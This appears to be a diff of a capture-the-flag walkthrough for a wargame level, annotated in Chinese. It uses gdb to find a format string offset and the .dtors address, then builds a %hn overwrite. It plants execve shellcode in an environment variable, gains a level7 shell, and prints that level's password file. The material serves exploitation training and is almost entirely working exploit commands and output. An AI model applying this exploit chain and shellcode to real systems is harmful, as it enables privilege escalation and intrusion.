@@ -1,3 +1,4 @@
+
 #include <stdio.h> 
 #include <stdlib.h>
 int main (int argc, char *argv[]) {
@@ -69,7 +70,72 @@ Breakpoint 1, 0x080483ac in main ()     /*停在push %ebp上*/
    0xbfffdc2b:      "/tmp/level6/level6"
    (gdb) x/s *0xbfffdb18
    0xbfffdc3e:      "AAAA"
-   (gdb) 
 */
+(gdb) r $(perl -e 'print "AAAA"."[%08x]"x(10)') 
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /levels/level6/level6 $(perl -e 'print "AAAA"."[%08x]"x(10)')
+/* 不要在perl打印的字符串中含有空格，否则会截断*/
+Breakpoint 2, 0x080483ac in main ()
+(gdb) c
+Continuing.
+
+Breakpoint 1, 0x08048409 in main ()
+(gdb) c
+Continuing.
+
+Breakpoint 3, 0x0804840e in main ()
+(gdb) x/8x $esp
+0xbfffd810:     0xbfffd840      0x00000200      0xbfffdc01      0x00000000
+0xbfffd820:     0x00000000      0x00000000      0x00000000      0x00000000
+(gdb) x/s 0xbfffdc01
+0xbfffdc01:      "AAAA[%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x]"
+(gdb) x/s 0xbfffd840
+0xbfffd840:      "AAAA[00000000][00000000][00000000][00000000][00000000][00000000][00000000][00000000][00000000][41414141]"
+(gdb) 
+
+offset = 10
+写入地址dtors: 0x8049580 + 4 = 0x8049584
+[level6@logic level6]$ objdump -s -j .dtors /levels/level6/level6
+
+/levels/level6/level6:     file format elf32-i386
+
+Contents of section .dtors:
+ 8049580 ffffffff 00000000                    ........        
+[level6@logic level6]$
+
+构造字符串(方法参见Gray Hat Hacking 11章)
+[addr + 2]
+\x86\x95\x04\x08
+
+[addr]
+\x84\x95\x04\x08 
+
+%[HOB-8]x
+%.49143x 
+
+%[offset]$hn
+%10\$hn 
+
+%[LOB-HOB]x
+%.8117x 
+
+%[offset + 1]$hn
+%11\$hn
+
+[level6@logic level6]$ export PAYLOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
+[level6@logic level6]$ cd /tmp/level6
+[level6@logic level6]$ ./getenv PAYLOAD
+PAYLOAD is at 0xbfffdfb0
+[level6@logic level6]$ cd /levels/level6
+[level6@logic level6]$ ./level6 $(python -c "print '\x86\x95\x04\x08\x84\x95\x04\x08'+'%.49143x%10\$hn%.8113x%11\$hn'")
+bash-3.2$ whoami
+level7
+bash-3.2$ cd /home/level7
+bash-3.2$ more .pass
+oa0Uicia
+bash-3.2$ 
+
+
 
    
